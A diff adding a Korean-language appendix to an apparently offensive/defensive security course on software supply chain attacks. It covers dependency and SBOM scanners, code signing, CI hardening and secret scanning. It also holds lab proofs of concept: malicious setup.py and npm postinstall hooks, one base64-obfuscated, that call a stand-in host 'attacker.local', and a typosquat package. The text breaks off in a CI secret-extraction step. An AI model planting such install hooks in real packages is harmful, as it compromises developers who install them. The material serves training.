@@ -600,3 +600,926 @@ graph LR
 
 **학생 액션**: APK reverse.
 
+
+---
+
+## 부록: 학습 OSS 도구 매트릭스 (Course13 Attack Advanced — Week 12 공급망 공격 / 종속성 혼동·CI-CD·SBOM)
+
+> 이 부록은 lab `attack-adv-ai/week12.yaml` (15 step + multi_task) 의 모든 명령을
+> 실제로 실행 가능한 형태로 도구·옵션·예상 출력·해석을 한 곳에 모았다.
+> Red Team 의 공급망 침해 (T1195 의 3 sub-techniques) + Blue Team 의 SBOM·서명·SLSA 통제를
+> 양면으로 다룬다. 모든 Red 실습은 격리 PyPI/npm mirror (verdaccio, devpi) 에서 수행한다 —
+> 절대 공개 PyPI/npm 에 악성 패키지를 등록하지 않는다.
+
+### lab step → 도구 매핑 표
+
+| step | 학습 항목 | 핵심 OSS 도구 / 명령 | ATT&CK | Blue 통제 |
+|------|----------|---------------------|--------|-----------|
+| s1 | 의존성·취약점 분석 | `pip list`, `pip-audit`, `npm audit`, `safety`, `osv-scanner` | T1195.001 | Snyk / Dependabot |
+| s2 | Dependency Confusion | `verdaccio` (mirror), `setup.py` post_install, `--index-url` | T1195.001 | Artifactory proxy + scope `@org/pkg` |
+| s3 | Typosquatting | `pypi-typosquatting-checker`, `confused`, `npq` | T1195.001 | DNS-style 사전 검증 + 유사도 스캐너 |
+| s4 | CI/CD 공격 (GH Actions) | `actionlint`, `pinact`, `harden-runner`, OIDC | T1195.002 | Required reviewers + branch protection |
+| s5 | Post-install Hook | `setup.py` cmdclass, `package.json` scripts | T1195.001 | `npm install --ignore-scripts` |
+| s6 | SolarWinds (SUNBURST) | YARA, Volatility, MISP, OpenCTI | T1195.002 / T1027 | 빌드서버 격리 + reproducible build |
+| s7 | 코드 서명 검증 | `gpg`, `cosign`, `sigstore-python`, `slsa-verifier` | T1553.002 | Sigstore + Rekor transparency log |
+| s8 | Docker 이미지 공급망 | `trivy image`, `grype`, `dive`, `syft`, `docker scout` | T1195.002 | Distroless + multi-stage + signed |
+| s9 | SBOM 생성·분석 | `syft`, `cyclonedx-cli`, `spdx-tools`, `dependency-track` | NIST SBOM | 빌드별 SBOM 자동 생성 + 비교 |
+| s10 | npm/PyPI install hooks | `npq`, `npm-package-arg`, `pip download --no-deps` | T1195.001 | `--ignore-scripts` 기본 + audit |
+| s11 | Git 공격 | `gitleaks`, `trufflehog`, GPG signed commits, `git fsck` | T1195 / T1078 | Branch protection + signed commits + Rekor |
+| s12 | 하드웨어 공급망 | `binwalk`, `chipsec`, `flashrom`, `uefi-firmware-parser` | T1195.003 | TPM measured boot + Secure Boot |
+| s13 | 공급망 모니터링 | `dependency-track`, `OpenSSF Scorecard`, `osquery` | DETECT | SBOM diff alert + scorecard threshold |
+| s14 | SLSA 평가 | `slsa-verifier`, `slsa-github-generator`, `in-toto` | NIST SSDF | SLSA Level 진단 + provenance 강제 |
+| s15 | 공급망 보안 로드맵 | NIST SSDF / SLSA / SOC 2 / EO 14028 | NIST SSDF | 분기별 성숙도 평가 |
+| s99 | 통합 다단계 (s1→s2→s3→s4→s5) | Bastion plan: dep-audit·confusion-PoC·typo-check·gh-actionlint·setup.py 시뮬 | 다중 | 단계별 통제 누적 |
+
+> **읽는 법**: lab 의 `script:` 와 `bastion_prompt:` 가 같은 명령을 사용한다. 학생은
+> (a) 본문 명령 직접 실행 (b) Bastion 에이전트에 prompt 던짐 (c) 두 결과의 차이 비교
+> 셋 다 가능. 공급망 PoC 는 *반드시* 격리 mirror 에서만 수행한다.
+
+### 학생 환경 준비 (의존성·SBOM·서명·CI-CD 풀세트)
+
+```bash
+# === [Red+Blue] 의존성·취약점 스캐너 ===
+pip install --user pip-audit safety osv-scanner
+pip install --user pipdeptree pip-licenses
+sudo apt install -y npm
+sudo npm install -g npm-audit-html npq
+which pip-audit safety pipdeptree
+
+# === [Red] 격리 PyPI/npm mirror — Dependency Confusion PoC 안전판 ===
+# verdaccio (npm 사설 레지스트리)
+sudo npm install -g verdaccio
+verdaccio --listen 0.0.0.0:4873 &
+# devpi (PyPI 사설 레지스트리)
+pip install --user devpi-server devpi-client
+devpi-init && devpi-server --host 0.0.0.0 --port 3141 &
+devpi use http://localhost:3141 && devpi user -c demo password=demo
+devpi login demo --password=demo
+devpi index -c dev
+
+# === [Red] Typosquatting 탐지 / 시뮬 ===
+pip install --user typoguard         # 인기 패키지 유사도 검사 (자체 작성 OK)
+git clone https://github.com/visma-prodsec/confused /tmp/confused
+cd /tmp/confused && go build -o confused .
+sudo cp confused /usr/local/bin/
+
+# === [Blue] SBOM 도구 ===
+# syft (Anchore) — sbom 생성기
+curl -sSfL https://raw.githubusercontent.com/anchore/syft/main/install.sh | sudo sh -s -- -b /usr/local/bin
+syft version
+
+# cyclonedx-cli + spdx-tools
+pip install --user cyclonedx-bom
+sudo apt install -y spdx-tools
+
+# dependency-track (서버형, 옵션)
+docker run -d -p 8080:8080 dependencytrack/apiserver
+docker run -d -p 8081:8080 dependencytrack/frontend
+
+# === [Blue] 컨테이너 이미지 스캐너 ===
+# trivy
+sudo apt install -y wget apt-transport-https gnupg
+wget -qO- https://aquasecurity.github.io/trivy-repo/deb/public.key | sudo apt-key add -
+echo deb https://aquasecurity.github.io/trivy-repo/deb $(lsb_release -sc) main | sudo tee /etc/apt/sources.list.d/trivy.list
+sudo apt update && sudo apt install -y trivy
+
+# grype (Anchore)
+curl -sSfL https://raw.githubusercontent.com/anchore/grype/main/install.sh | sudo sh -s -- -b /usr/local/bin
+grype version
+
+# dive — Docker 이미지 레이어 분석
+sudo apt install -y wget
+wget -q https://github.com/wagoodman/dive/releases/download/v0.12.0/dive_0.12.0_linux_amd64.deb
+sudo dpkg -i dive_*.deb
+
+# === [Blue] 코드 서명 ===
+sudo apt install -y gnupg
+gpg --gen-key       # 대화형 — 학생당 1 key
+gpg --list-keys
+
+# Sigstore cosign + sigstore-python
+curl -sSfL -o cosign https://github.com/sigstore/cosign/releases/latest/download/cosign-linux-amd64
+sudo install cosign /usr/local/bin/
+pip install --user sigstore
+
+# slsa-verifier
+go install github.com/slsa-framework/slsa-verifier/v2/cli/slsa-verifier@latest
+
+# === [Blue] CI/CD 보안 ===
+# actionlint — GitHub Actions YAML lint
+go install github.com/rhysd/actionlint/cmd/actionlint@latest
+which actionlint
+
+# pinact — actions 의 SHA pinning 자동화
+go install github.com/suzuki-shunsuke/pinact/cmd/pinact@latest
+
+# harden-runner — Step Security 의 GH Action
+# (GitHub Actions YAML 에 추가만 하면 됨)
+
+# === [Blue] Git secret scanning ===
+# gitleaks
+curl -sSfL -o gitleaks.tar.gz https://github.com/gitleaks/gitleaks/releases/latest/download/gitleaks_8.18.0_linux_x64.tar.gz
+tar xf gitleaks.tar.gz && sudo install gitleaks /usr/local/bin/
+
+# trufflehog
+curl -sSfL https://raw.githubusercontent.com/trufflesecurity/trufflehog/main/scripts/install.sh | sudo sh -s -- -b /usr/local/bin
+
+# === [Red+Blue] 하드웨어/펌웨어 ===
+sudo apt install -y binwalk
+pip install --user uefi-firmware
+git clone https://github.com/chipsec/chipsec /tmp/chipsec
+# chipsec 은 root 필요, 실 하드웨어에서만 의미 있음 — VM 에서는 데모 용
+
+# === [Blue] SLSA / in-toto ===
+go install github.com/in-toto/in-toto-golang/cmd/in-toto@latest
+
+# === [Blue] OpenSSF Scorecard ===
+go install github.com/ossf/scorecard/v4@latest
+which scorecard
+```
+
+각 도구가 lab step 의 어디에 활용되는지 위 매핑표와 1:1 대응. s2 의 dependency confusion 은 verdaccio + devpi 가 사전 설치되어야 안전하게 실습 가능.
+
+### 핵심 도구별 상세 사용법
+
+#### 도구 1: pip-audit / safety / osv-scanner — 의존성 취약점 스캐너 (Step 1)
+
+```bash
+# pip-audit — Google 의 OSV 데이터베이스 사용
+pip-audit -r requirements.txt
+# 출력 예
+# Found 3 known vulnerabilities in 2 packages
+# Name      Version  ID                 Fix Versions
+# requests  2.20.0   PYSEC-2018-28      2.20.0
+# requests  2.20.0   GHSA-x84v-xcm2-53pg 2.31.0
+# urllib3   1.24.1   PYSEC-2019-132     1.24.2
+
+pip-audit --format json -o /tmp/audit.json
+jq '.dependencies[] | select(.vulns | length > 0) | {name, vulns: .vulns[].id}' /tmp/audit.json
+
+# safety — pyup.io 데이터베이스
+safety check --file requirements.txt --json
+safety check -r requirements.txt --output text --full-report
+
+# osv-scanner — Google 의 정식 CLI
+osv-scanner --recursive .
+osv-scanner --lockfile=requirements.txt
+
+# npm 생태계
+npm audit
+npm audit --json | jq '.metadata.vulnerabilities'
+npm audit fix --force         # 자동 수정 (BREAKING 가능)
+
+# yarn / pnpm
+yarn audit --groups dependencies
+pnpm audit
+
+# Cargo (Rust)
+cargo install cargo-audit
+cargo audit
+
+# Go
+go list -m -u all
+go install golang.org/x/vuln/cmd/govulncheck@latest
+govulncheck ./...
+```
+
+직접 의존성 (top-level) 만 점검하면 안 됨 — 전이적 의존성 (transitive) 의 CVE 가 더 흔하다. `pipdeptree` 로 트리 구조 시각화:
+
+```bash
+pipdeptree -p requests
+# requests==2.31.0
+# ├── certifi [required: >=2017.4.17, installed: 2023.7.22]
+# ├── charset-normalizer [required: >=2,<4, installed: 3.3.0]
+# ├── idna [required: >=2.5,<4, installed: 3.4]
+# └── urllib3 [required: >=1.21.1,<3, installed: 2.0.7]
+```
+
+#### 도구 2: verdaccio + setup.py — Dependency Confusion PoC (Step 2)
+
+```bash
+# === 격리 환경 PoC — 절대 공개 PyPI/npm 에서 시도 금지 ===
+
+# 1) 사설 레지스트리에 "내부" 패키지 mycompany-utils v1.0 등록
+mkdir /tmp/internal-pkg && cd /tmp/internal-pkg
+cat > setup.py << 'PY'
+from setuptools import setup
+setup(name="mycompany-utils", version="1.0", description="internal")
+PY
+python setup.py sdist
+devpi upload dist/*
+
+# 2) 공격자가 동일 이름 v99.0 을 더 높은 버전으로 등록 (별도 디렉터리)
+mkdir /tmp/evil-pkg && cd /tmp/evil-pkg
+cat > setup.py << 'PY'
+from setuptools import setup, Command
+from setuptools.command.install import install
+import os, socket
+
+class PostInstall(install):
+    def run(self):
+        host = socket.gethostname()
+        # 격리 환경에서는 callback 만 — 실제 reverse shell 금지
+        os.system(f"curl -s 'http://attacker.local/cb?h={host}&pkg=mycompany-utils' > /tmp/exfil.log 2>&1 || true")
+        install.run(self)
+
+setup(name="mycompany-utils", version="99.0",
+      description="malicious",
+      cmdclass={'install': PostInstall})
+PY
+python setup.py sdist
+twine upload --repository-url http://localhost:3141/demo/dev/ dist/*
+
+# 3) 빌드 시스템 (--extra-index-url 사용 시) — 공격 성공
+pip install --extra-index-url http://localhost:3141/demo/dev/ mycompany-utils
+# Resolved: mycompany-utils 99.0 (★ 공개 v99 가 우선)
+# /tmp/exfil.log 에 callback 흔적 남음
+
+# 4) 방어 (--index-url 단일 사용) — 공격 실패
+pip install --index-url http://internal.devpi.local/ mycompany-utils
+# Resolved: mycompany-utils 1.0 (★ 안전)
+
+# === npm 동일 시나리오 ===
+mkdir /tmp/internal-npm && cd /tmp/internal-npm
+cat > package.json << 'JSON'
+{"name":"mycompany-utils","version":"1.0.0","main":"index.js"}
+JSON
+echo 'console.log("internal");' > index.js
+npm publish --registry http://localhost:4873
+
+mkdir /tmp/evil-npm && cd /tmp/evil-npm
+cat > package.json << 'JSON'
+{
+  "name":"mycompany-utils",
+  "version":"99.0.0",
+  "main":"index.js",
+  "scripts": {"postinstall":"node -e \"require('http').get('http://attacker.local/cb?pkg=' + process.env.npm_package_name)\""}
+}
+JSON
+echo 'console.log("evil");' > index.js
+npm publish --registry http://public-mirror.local
+
+# 방어 — scope 사용
+# package.json 에 "name": "@mycompany/utils" 로 변경하면
+# npm 은 @mycompany 만 사설 registry, 다른 것은 공개로 자동 분리
+```
+
+탐지 (Blue): `npm config get registry` + `pip config list` 으로 모든 빌드머신의 settings 검사. CI 에는 `verdaccio --config strict.yaml` 의 `proxy: false` 모드로 강제.
+
+#### 도구 3: confused / typoguard — Typosquatting 탐지 (Step 3)
+
+```bash
+# confused — Visma Prosec 의 namespace 검사 도구
+confused -l pip requirements.txt
+# Issues found, the following packages are not available in public package repositories:
+# [!] mycompany-internal
+# [!] mycompany-utils
+
+confused -l npm package.json
+
+# 패키지 이름 유사도 — Levenshtein distance + Damerau (글자 swap)
+python3 << 'PY'
+import Levenshtein
+popular = ["requests","urllib3","numpy","pandas","tensorflow","django","flask","matplotlib"]
+target  = "reqeusts"      # typo
+for p in popular:
+    d = Levenshtein.distance(p, target)
+    if d <= 2:
+        print(f"[!] {target} too similar to {p} (distance {d})")
+PY
+
+# npq — npm install 전 평가
+npq install lodash
+# ✓ lodash@4.17.21
+#   ✓ Maintainer activity: high
+#   ✓ Downloads: 50M/week
+#   ✓ Created: 2012 (mature)
+#   ✓ No similar suspicious packages
+
+# 패키지 메타데이터 직접 검사
+curl -s https://pypi.org/pypi/requests/json | jq '{name, info: {author, home_page, project_urls}, urls: [.urls[].upload_time]}'
+curl -s https://registry.npmjs.org/lodash | jq '{name, time: .time.created, maintainers: .maintainers}'
+
+# 인기 패키지 유사 이름 후보 — 공격자 시점
+python3 << 'PY'
+target = "requests"
+# typo, dash 제거, hyphen → underscore, 단수/복수
+candidates = [target+"s", target.replace("e","3"), "request", "requets", "reqests", "requestt"]
+for c in candidates:
+    print(f"https://pypi.org/project/{c}/")
+PY
+```
+
+탐지 (Blue): 모든 `requirements.txt` / `package.json` 을 CI 에서 `confused` 로 검사 + 신규 의존성 추가 시 `npq install` 강제. 인기 패키지의 알려진 typo 명단 (예: pip 의 `pypa/advisory-database`) 을 deny-list 로 등록.
+
+#### 도구 4: actionlint / pinact / harden-runner — GitHub Actions 보안 (Step 4)
+
+```bash
+# actionlint — workflow YAML 검증
+cd /path/to/repo
+actionlint
+# .github/workflows/release.yml:5:9: shell name "${{ inputs.shell }}" is not valid [shell-name]
+# .github/workflows/release.yml:18:9: "actions/checkout@v3" should be pinned to commit SHA [pinned-versions]
+
+# pinact — 모든 action 을 SHA 로 pin 자동 변환
+pinact run .github/workflows/*.yml
+# Before: uses: actions/checkout@v4
+# After:  uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.1.1
+
+# harden-runner — runtime egress 차단
+cat > .github/workflows/secure.yml << 'YML'
+name: Secure CI
+on: [push]
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: read    # ★ 최소 권한
+    steps:
+      - uses: step-security/harden-runner@cba0d00b1fc9a034e1e642ea0f1103c282990604 # v2.5.0
+        with:
+          egress-policy: block
+          allowed-endpoints: >
+            github.com:443
+            api.github.com:443
+            objects.githubusercontent.com:443
+      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.1.1
+      - run: make test
+YML
+
+# OIDC — secret 없는 cloud auth (AWS/GCP/Azure)
+cat > .github/workflows/oidc.yml << 'YML'
+permissions:
+  id-token: write   # OIDC token 발급
+  contents: read
+steps:
+  - uses: aws-actions/configure-aws-credentials@v4
+    with:
+      role-to-assume: arn:aws:iam::123456789012:role/GitHubActions
+      aws-region: us-east-1
+  - run: aws s3 ls
+YML
+
+# Branch protection rules (gh CLI)
+gh api repos/:owner/:repo/branches/main/protection -X PUT -f required_status_checks[strict]=true \
+  -f required_pull_request_reviews[required_approving_review_count]=2 \
+  -f enforce_admins=true \
+  -f restrictions=null
+
+# pull request reviewer requirements + signed commits
+gh api repos/:owner/:repo/branches/main/protection/required_signatures -X POST
+```
+
+CI/CD 의 핵심 통제: **3 레이어**.
+1. **Workflow 자체** — actionlint / pinact / minimum permissions
+2. **Runner** — harden-runner egress block + ephemeral runner
+3. **Branch** — required reviews / signed commits / status checks
+
+#### 도구 5: syft / cyclonedx — SBOM 생성·분석 (Step 9)
+
+```bash
+# syft — Anchore SBOM 생성기 (CycloneDX/SPDX/Syft 형식)
+syft packages dir:. -o cyclonedx-json > /tmp/sbom.cdx.json
+syft packages dir:. -o spdx-json > /tmp/sbom.spdx.json
+syft packages registry:nginx:latest -o cyclonedx-json > /tmp/nginx-sbom.json
+
+# 빠른 inventory
+syft packages dir:.
+# NAME           VERSION  TYPE
+# requests       2.31.0   python
+# urllib3        2.0.7    python
+# certifi        2023.7.22 python
+# (...)
+
+# cyclonedx-cli — SBOM 분석·diff·merge
+cyclonedx-bom -i requirements.txt -o /tmp/python-sbom.xml
+cyclonedx-bom diff old-sbom.json new-sbom.json
+# 출력: 추가/제거/변경된 component 비교
+
+# Dependency-Track 에 SBOM 업로드 (dashboard)
+curl -X POST -H "X-Api-Key: $DT_KEY" \
+  -F "project=00000000-0000-0000-0000-000000000000" \
+  -F "bom=@/tmp/sbom.cdx.json" \
+  http://localhost:8080/api/v1/bom
+
+# OSV-Scanner 로 SBOM 직접 검사
+osv-scanner --sbom=/tmp/sbom.cdx.json
+
+# SPDX 형식 변환 (regulator/legal 우호적)
+spdx-tools convert -i /tmp/sbom.spdx.json -o /tmp/sbom.xlsx -f xlsx
+
+# SBOM 비교 — release 간 차이 자동
+diff <(jq '.components[] | "\(.name)@\(.version)"' v1.0-sbom.json | sort) \
+     <(jq '.components[] | "\(.name)@\(.version)"' v1.1-sbom.json | sort)
+```
+
+NIST 의 **Minimum Elements for SBOM** (EO 14028):
+- Author / Supplier / Component name / Version / Unique identifier (PURL/CPE) / Dependency relationships / Author of SBOM data / Timestamp
+
+`syft` 의 출력은 위 7요소를 모두 충족. CI 에 `syft + osv-scanner + cyclonedx diff` 3 단계로 자동화.
+
+#### 도구 6: trivy / grype / dive — 컨테이너 이미지 분석 (Step 8)
+
+```bash
+# Trivy — Aqua Security 의 종합 스캐너
+trivy image nginx:latest
+# nginx:latest (debian 12.5)
+# ============================
+# Total: 64 (UNKNOWN: 0, LOW: 38, MEDIUM: 19, HIGH: 6, CRITICAL: 1)
+# 
+# ┌─────────────┬──────────────┬──────────┬─────────────┬───────────────┐
+# │ Library     │ Vulnerability│ Severity │ Installed   │ Fixed Version │
+# ├─────────────┼──────────────┼──────────┼─────────────┼───────────────┤
+# │ libssl3     │ CVE-2024-2511│ MEDIUM   │ 3.0.11-1~deb12u1 │ 3.0.13-1~deb12u1 │
+# (...)
+
+trivy image --severity HIGH,CRITICAL --exit-code 1 nginx:latest
+trivy image --format sarif -o trivy.sarif nginx:latest    # GitHub Code Scanning 호환
+
+# 비밀 스캔 + IaC 동시
+trivy fs --scanners vuln,secret,config /path/to/repo
+
+# Grype — Anchore 의 취약점 스캐너 (syft 와 짝)
+syft packages nginx:latest -o json | grype
+# 또는 직접
+grype nginx:latest
+grype dir:.
+
+# dive — 레이어별 파일 변경 분석 (악성 레이어 탐지)
+dive nginx:latest
+# 좌측: 레이어별 명령 (ADD/COPY/RUN)
+# 우측: 추가/수정/삭제된 파일
+# Image 효율성: 87% (불필요한 파일 13%)
+
+# 의심 시그니처 — 레이어 안에 SUID, /tmp 의 binary, ssh key
+docker save nginx:latest | tar -xO --wildcards '*/layer.tar' | tar -t | grep -E "(\.ssh|setuid|/tmp/)"
+
+# Distroless / multi-stage 권장
+cat > Dockerfile << 'DK'
+FROM golang:1.21 AS build
+WORKDIR /src
+COPY . .
+RUN CGO_ENABLED=0 go build -o /app
+
+FROM gcr.io/distroless/static:nonroot
+COPY --from=build /app /app
+USER nonroot
+ENTRYPOINT ["/app"]
+DK
+
+# 이미지 서명 (cosign)
+cosign generate-key-pair
+cosign sign --key cosign.key myregistry.io/nginx:latest
+cosign verify --key cosign.pub myregistry.io/nginx:latest
+# Verification for myregistry.io/nginx:latest --
+# The following checks were performed on each of these signatures:
+#   - The cosign claims were validated
+#   - The signatures were verified against the specified public key
+```
+
+distroless + multi-stage + cosign 서명 3 단계는 컨테이너 공급망의 *기본*. golden image 정책은 이 위에 reproducible build (Bazel/Nix) 을 더한다.
+
+#### 도구 7: gpg / cosign / sigstore — 코드·아티팩트 서명 (Step 7)
+
+```bash
+# === 전통적 GPG ===
+gpg --gen-key
+gpg --list-secret-keys
+# sec  rsa3072 2026-05-02 [SC]
+#       ABCDEF1234567890ABCDEF1234567890ABCDEF12
+
+KEY_ID=ABCDEF1234567890ABCDEF1234567890ABCDEF12
+
+# 파일 서명
+echo "release-1.0" > release.txt
+gpg --detach-sign -a -u $KEY_ID release.txt
+ls
+# release.txt  release.txt.asc
+
+# 공개키 export + 검증
+gpg --export -a $KEY_ID > public.key
+gpg --import public.key
+gpg --verify release.txt.asc release.txt
+# gpg: Good signature from "Student <student@corp.example>"
+
+# git commit 서명
+git config user.signingkey $KEY_ID
+git config commit.gpgsign true
+git commit -S -m "signed commit"
+git log --show-signature -1
+
+# === Sigstore cosign — keyless OIDC 서명 ===
+# 키 생성 없이 GitHub OIDC 로 서명 (CI 에서 사용)
+cosign sign --yes ghcr.io/myorg/myapp:1.0
+# 브라우저 OIDC flow → Fulcio 가 임시 인증서 발급 → Rekor 에 서명 기록
+
+cosign verify ghcr.io/myorg/myapp:1.0 \
+  --certificate-identity=https://github.com/myorg/myapp/.github/workflows/release.yml@refs/heads/main \
+  --certificate-oidc-issuer=https://token.actions.githubusercontent.com
+
+# 키 기반 (offline)
+cosign generate-key-pair
+cosign sign --key cosign.key ghcr.io/myorg/myapp:1.0
+cosign verify --key cosign.pub ghcr.io/myorg/myapp:1.0
+
+# Rekor transparency log 검색
+rekor-cli search --artifact /tmp/release.txt
+rekor-cli get --uuid abc123...
+
+# === sigstore-python — PyPI 서명 ===
+sigstore sign release-1.0.tar.gz
+# Generates release-1.0.tar.gz.sigstore
+sigstore verify identity \
+  --cert-identity user@example.com \
+  --cert-oidc-issuer https://accounts.google.com \
+  release-1.0.tar.gz
+
+# === SLSA Verifier (provenance + 서명 동시 검증) ===
+slsa-verifier verify-artifact ghcr.io/myorg/myapp:1.0 \
+  --provenance-path provenance.intoto.jsonl \
+  --source-uri github.com/myorg/myapp \
+  --source-tag v1.0
+```
+
+GPG 의 한계: 키 분배·revocation 어려움. 현대 권장은 **Sigstore (cosign + Rekor + Fulcio)** — 키 없이 OIDC 로 서명 + 모든 서명이 공개 transparency log 에 기록되어 탈취/위조 불가.
+
+#### 도구 8: gitleaks / trufflehog — Git 시크릿 스캔 (Step 11)
+
+```bash
+# gitleaks — 가장 빠르고 정확
+cd /path/to/repo
+gitleaks detect --verbose
+# Finding: AWS Access Key
+# Secret: AKIAIOSFODNN7EXAMPLE
+# RuleID: aws-access-token
+# File: .env.local
+# Commit: abc123
+
+gitleaks detect --report-format json --report-path /tmp/leaks.json
+gitleaks protect --staged                  # pre-commit hook 용
+
+# 사용자 정의 룰
+cat > .gitleaks.toml << 'TOML'
+[[rules]]
+id = "internal-api"
+description = "Internal API key"
+regex = '''ic_[a-z0-9]{32}'''
+keywords = ["ic_"]
+TOML
+gitleaks detect --config .gitleaks.toml
+
+# trufflehog — 검증 (실제 작동하는 키만 필터)
+trufflehog git file:///path/to/repo --only-verified
+# AWS access key found and verified (returns 200 from STS)
+
+trufflehog github --org=myorg --token=$GH_TOKEN --only-verified
+
+# 과거 커밋까지 검사 (필수)
+git log --all --full-history --source -p > /tmp/all-commits.txt
+gitleaks detect --source /tmp/all-commits.txt
+
+# 누출된 시크릿 즉시 행동
+# 1) 즉시 revoke (AWS console / GitHub PAT 등)
+# 2) git filter-repo 로 git history 에서 제거 (BFG Repo-Cleaner 도 가능)
+git filter-repo --invert-paths --path .env.local
+git filter-repo --replace-text replacements.txt   # 패턴 치환
+
+# 3) Force push (모든 fork 와 PR 에 알림 필요)
+git push --force --all
+
+# pre-commit hook (필수)
+pip install pre-commit
+cat > .pre-commit-config.yaml << 'YML'
+repos:
+- repo: https://github.com/gitleaks/gitleaks
+  rev: v8.18.0
+  hooks:
+    - id: gitleaks
+- repo: https://github.com/trufflesecurity/trufflehog
+  rev: v3.63.0
+  hooks:
+    - id: trufflehog
+      args: ['git', 'file://.', '--only-verified']
+YML
+pre-commit install
+```
+
+핵심 — git history 의 시크릿은 *commit 이 살아있는 한 영원히 노출* 된다. 발견 즉시 (a) revoke (b) history rewrite (c) force push 3 단계를 한 시간 내 완료해야 한다.
+
+#### 도구 9: in-toto / SLSA Verifier — 빌드 무결성 (Step 14)
+
+```bash
+# in-toto — 빌드 단계별 attestation
+# Layout 정의 (어떤 functionary 가 어떤 step 을 수행하는지)
+in-toto-keygen alice
+in-toto-keygen bob
+
+cat > root.layout << 'LAYOUT'
+{
+  "signed": {
+    "_type": "layout",
+    "expires": "2027-01-01T00:00:00Z",
+    "keys": {"alice": {...}, "bob": {...}},
+    "steps": [
+      {"_name": "fetch", "expected_command": ["git", "clone"], "pubkeys": ["alice"], ...},
+      {"_name": "build", "expected_command": ["make"], "pubkeys": ["bob"], ...}
+    ],
+    "inspect": [...]
+  }
+}
+LAYOUT
+
+in-toto-sign root.layout -k alice
+in-toto-run --step-name fetch --key alice -- git clone https://github.com/myorg/repo
+in-toto-run --step-name build --key bob -- make
+
+in-toto-verify --layout root.layout --layout-keys alice.pub
+# Verification passed: all steps' attestations verified
+
+# === SLSA — Supply chain Levels for Software Artifacts ===
+# Level 1: 빌드 스크립트 + provenance 메타데이터
+# Level 2: 호스팅된 빌드 시스템 + 서명된 provenance
+# Level 3: 격리된 빌드 + non-falsifiable provenance
+# Level 4: 2명 review + reproducible build + hermetic
+
+# GitHub Actions 의 SLSA Level 3 generator
+cat > .github/workflows/release.yml << 'YML'
+on: { push: { tags: ["v*"] } }
+permissions: { contents: write, id-token: write, actions: read }
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    outputs: { hashes: ${{ steps.hash.outputs.hashes }} }
+    steps:
+      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11
+      - run: make release
+      - id: hash
+        run: echo "hashes=$(sha256sum dist/* | base64 -w0)" >> $GITHUB_OUTPUT
+  provenance:
+    needs: build
+    permissions: { id-token: write, contents: write, actions: read }
+    uses: slsa-framework/slsa-github-generator/.github/workflows/generator_generic_slsa3.yml@v1.9.0
+    with: { base64-subjects: ${{ needs.build.outputs.hashes }} }
+YML
+
+# 소비자 검증
+slsa-verifier verify-artifact dist/myapp-1.0.tar.gz \
+  --provenance-path myapp-1.0.intoto.jsonl \
+  --source-uri github.com/myorg/myapp \
+  --source-tag v1.0
+
+# === OpenSSF Scorecard — 자동 평가 ===
+scorecard --repo=github.com/myorg/myapp
+# Score: 6.7/10
+# - Maintained:        10/10
+# - Code-Review:        7/10  (recommend signed commits)
+# - Branch-Protection:  3/10  (★ require status checks)
+# - Pinned-Dependencies: 2/10 (★ pin actions)
+# - SAST:               5/10
+# - Token-Permissions:  9/10
+```
+
+SLSA Level 평가표:
+
+| Level | 빌드 | provenance | 격리 | 인력 |
+|-------|------|------------|------|------|
+| 1 | 스크립트 존재 | 메타데이터 | - | - |
+| 2 | 호스팅 빌드 | 서명됨 | - | - |
+| 3 | 호스팅 빌드 | non-falsifiable | hermetic | - |
+| 4 | 위 + reproducible | 위 | parameterless | 2-person review |
+
+학생 프로젝트는 보통 Level 1 → Level 2 (GH Actions 사용) → Level 3 (slsa-github-generator 도입) 으로 단계적 승격.
+
+### 점검 / 공격 / 방어 흐름 (15 step + multi_task 통합)
+
+#### Phase A — 의존성·서명 인벤토리 (정찰, s1·s9·s11)
+
+```bash
+# 1. Python 의존성 풀 inventory
+pip list --format json > /tmp/deps-py.json
+pipdeptree --json > /tmp/deps-py-tree.json
+pip-audit --format json > /tmp/audit-py.json
+
+# 2. Node.js 동일
+npm list --json --all > /tmp/deps-node.json
+npm audit --json > /tmp/audit-node.json
+
+# 3. 컨테이너 이미지 SBOM
+syft packages dir:. -o cyclonedx-json > /tmp/sbom.json
+osv-scanner --sbom=/tmp/sbom.json --format json > /tmp/sbom-vulns.json
+
+# 4. Git 시크릿 baseline
+gitleaks detect --report-format json --report-path /tmp/leaks-baseline.json
+
+# 5. CI/CD lint
+actionlint -format '{{json .}}' > /tmp/actionlint.json
+
+# 6. SLSA / Scorecard
+scorecard --repo=github.com/myorg/myapp --format json > /tmp/scorecard.json
+
+# 종합 dashboard
+cat > /tmp/supply-chain-baseline.txt << EOF
+=== Supply Chain Baseline ($(date +%F)) ===
+Python deps: $(jq '. | length' /tmp/deps-py.json)
+Node deps:   $(jq '.dependencies | length' /tmp/deps-node.json)
+Vulnerabilities (py):    $(jq '[.dependencies[] | select(.vulns | length > 0)] | length' /tmp/audit-py.json)
+Vulnerabilities (node):  $(jq '.metadata.vulnerabilities.total' /tmp/audit-node.json)
+SBOM components:         $(jq '.components | length' /tmp/sbom.json)
+Git secrets found:       $(jq '. | length' /tmp/leaks-baseline.json)
+CI lint findings:        $(jq '. | length' /tmp/actionlint.json)
+OpenSSF Scorecard:       $(jq '.score' /tmp/scorecard.json)
+EOF
+cat /tmp/supply-chain-baseline.txt
+```
+
+#### Phase B — 공격자 침해 시도 (s2·s3·s4·s5·s10)
+
+```bash
+# 1. Dependency Confusion (격리 mirror 에서만!)
+cd /tmp/evil-pkg && python setup.py sdist
+twine upload --repository-url http://localhost:3141/demo/dev/ dist/*
+
+# 2. Typosquatting 등록
+cd /tmp/typo-pkg && cat > setup.py << 'PY'
+setup(name="reqeusts", version="1.0", description="typo of requests")
+PY
+twine upload --repository-url http://localhost:3141/demo/dev/ dist/*
+
+# 3. Post-install Hook 페이로드
+cat > setup.py << 'PY'
+from setuptools.command.install import install
+class Bad(install):
+    def run(self):
+        import os, base64
+        cmd = base64.b64decode("Y3VybCBhdHRhY2tlci5sb2NhbA==").decode()
+        os.system(cmd + " > /tmp/exfil.log")
+        install.run(self)
+setup(name="evil-pkg", version="1.0", cmdclass={'install': Bad})
+PY
+
+# 4. CI/CD 공격 — fork → PR 으로 secret 추출
+# (격리 환경 시뮬: workflow 의 ${{ secrets.X }} 가 echo 되도록)
